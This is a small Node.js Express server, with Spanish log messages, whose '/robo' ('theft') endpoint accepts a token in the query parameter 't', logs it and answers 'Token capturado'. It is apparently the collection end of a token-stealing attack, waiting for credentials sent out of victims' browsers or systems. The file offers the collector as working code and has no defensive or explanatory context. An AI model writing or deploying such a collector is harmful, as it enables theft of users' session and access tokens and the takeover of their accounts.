const express = require("express");
const app = express();

app.get("/robo", (req, res) => {
  const token = req.query.t;
  console.log("📥 Token recibido:", token);
  res.send("✅ Token capturado");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor activo en el puerto ${PORT}`);
});
